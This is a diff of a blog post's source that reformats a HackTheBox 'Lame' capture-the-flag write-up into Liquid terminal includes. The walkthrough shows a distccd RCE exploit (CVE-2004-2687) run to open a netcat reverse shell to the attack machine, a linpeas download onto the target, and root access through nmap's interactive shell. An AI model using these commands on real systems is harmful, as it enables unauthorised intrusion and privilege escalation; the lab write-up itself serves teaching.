@@ -27,8 +27,7 @@ Here we are for a blast from the past.  Looking at Lame from HackTheBox.
 
 As a start, get the open ports by running nmap.
 
-{% raw %}
-```sh
+{% capture nmap %}
 └──╼ [★]$ nmap -sC -sV -A -O -oN nmap 10.10.10.3
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-17 04:52 CST
 Nmap scan report for 10.10.10.3
@@ -57,15 +56,17 @@ PORT    STATE SERVICE     VERSION
 445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
 
 <snip>
+{% endcapture %}
 
-```
-{% endraw %}
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmap %}
 
 <br />
 Run nmap again to scan all of the ports to find any hidden services.
 
-{% raw %}
-```sh
+{% capture nmapfull %}
 └──╼ [★]$ sudo nmap -sS -p- -oN nmapfull 10.10.10.3
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-17 04:53 CST
 Nmap scan report for 10.10.10.3
@@ -79,18 +80,20 @@ PORT     STATE SERVICE
 3632/tcp open  distccd
 
 Nmap done: 1 IP address (1 host up) scanned in 224.07 seconds
+{% endcapture %}
 
-```
-{% endraw %}
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmapfull %}
 
 <br />
 Google distccd to try and figure our what it is.  I have never seen it before.
 
-{% raw %}
-```sh
-Distcc is a program designed to distribute compiling tasks across a network to participating hosts.
-```
-{% endraw %}
+<div class="info-box">
+  Distcc is a program designed to distribute compiling tasks across a network to participating hosts.
+</div>
+
 <div class="row justify-content-sm-center">
     <div class="col-sm mt-3 mt-md-0">
         {% include figure.liquid loading="eager" path="/assets/img/lame/gentoo.png" title="Gentoo Distcc" class="img-fluid rounded z-depth-1" %}
@@ -121,8 +124,7 @@ Click on the GitHub gist from DarkCoderSc that has an exploit that we can use.
 <br />
 Update the exploit to change the strings that the sockets accept to bytes-like object.  Sockets no longer accept strings.
 
-{% raw %}
-```sh
+{% capture pythonexploit %}
 '''
 	distccd v1 RCE (CVE-2004-2687)
 	
@@ -229,9 +231,12 @@ try:
 	exploit(argv.command, argv.host, argv.port)
 except IOError:
 	parse.error
+{% endcapture %}
 
-```
-{% endraw %}
+{% include terminal.html
+   language="python"
+   title="exploit.py"
+   content=pythonexploit %}
 
 <br />
 Review the NIST entry that discusses this particular vulnerability.
@@ -246,12 +251,15 @@ Review the NIST entry that discusses this particular vulnerability.
 <br />
 Start a listener listening on 1403.
 
-{% raw %}
-```sh
+{% capture startlistener %}
 └──╼ [★]$ nc -nlvp 1403
 listening on [any] 1403 ...
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=startlistener %}
 
 <br />
 Run the payload.  Execute a reverse shell connecting to the attack machine on the port from the listener sending /bin/sh.
@@ -262,32 +270,37 @@ Run the payload.  Execute a reverse shell connecting to the attack machine on th
 <li>-c command</li>
 </ul>
 
-{% raw %}
-```sh
+{% capture runexploit %}
 └──╼ [★]$ python ./exploit_upd.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.29 1403 -e /bin/sh"
 [OK] Connected to remote service
 [KO] Socket Timeout
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=runexploit %}
 
 <br />
 Check the listener and catch the shell.  Upgrade the shell.
 
-{% raw %}
-```sh
+{% capture catchshell %}
 └──╼ [★]$ nc -nlvp 1403
 listening on [any] 1403 ...
 connect to [10.10.14.29] from (UNKNOWN) [10.10.10.3] 49941
 python -c 'import pty; pty.spawn("/bin/bash");'
 daemon@lame:/tmp$
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=catchshell %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```sh
+{% capture userflag %}
 daemon@lame:/home/makis$ cat user.txt
 cat user.txt
 <redacted>
@@ -312,8 +325,12 @@ lo        Link encap:Local Loopback
           TX packets:1284 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:0 
           RX bytes:597781 (583.7 KB)  TX bytes:597781 (583.7 KB)
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=userflag %}
 
 <br />
 Lookup Linpeas.  Linpeas, if you don't know, is a scripts that will perform a number of checks for privilege escalation and highlight the likely path to privesc.
@@ -328,8 +345,7 @@ Lookup Linpeas.  Linpeas, if you don't know, is a scripts that will perform a nu
 <br />
 Download the script to your working folder.  Start a python webserver to serve the script.  Transfer the script to the victim machine.
 
-{% raw %}
-```sh
+{% capture transferlinpeas %}
 daemon@lame:/dev/shm$ wget 10.10.14.29:8000/linpeas.sh
 wget 10.10.14.29:8000/linpeas.sh
 --07:27:04--  http://10.10.14.29:8000/linpeas.sh
@@ -344,14 +360,17 @@ Length: 830,426 (811K) [text/x-sh]
 
 daemon@lame:/dev/shm$ chmod +x linpeas.sh                                                             
 chmod +x linpeas.sh
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=transferlinpeas %}
 
 <br />
 Run the linpeas script.  Notice that nmap has the sticky bit.
 
-{% raw %}
-```sh
+{% capture runlinpeas %}
 daemon@lame:/dev/shm$ ./linpeas.sh
 ./linpeas.sh
 
@@ -389,8 +408,12 @@ daemon@lame:/dev/shm$ ./linpeas.sh
 -rwsr-xr-x 1 root root 24K Apr  2  2008 /usr/bin/chsh
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=runlinpeas %}
 
 <br />
 Lookup the GTFOBins for nmap to get a sense of how we can abuse it.
@@ -405,8 +428,7 @@ Lookup the GTFOBins for nmap to get a sense of how we can abuse it.
 <br />
 Enter nmap interactive mode and use !sh to enter a shell.
 
-{% raw %}
-```sh
+{% capture nmapshell %}
 daemon@lame:/dev/shm$ nmap --interactive
 nmap --interactive
 
@@ -417,14 +439,17 @@ nmap> !sh
 sh-3.2# whoami
 whoami
 root
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmapshell %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```sh
+{% capture rootflag %}
 sh-3.2# cat /root/root.txt
 cat /root/root.txt
 <redacted>
@@ -449,8 +474,12 @@ lo        Link encap:Local Loopback
           TX packets:1685 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:0 
           RX bytes:798921 (780.1 KB)  TX bytes:798921 (780.1 KB)
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=rootflag %}
 
 <br />
 Thank you so much for reading.  Hopefully my post wasn't too lame.
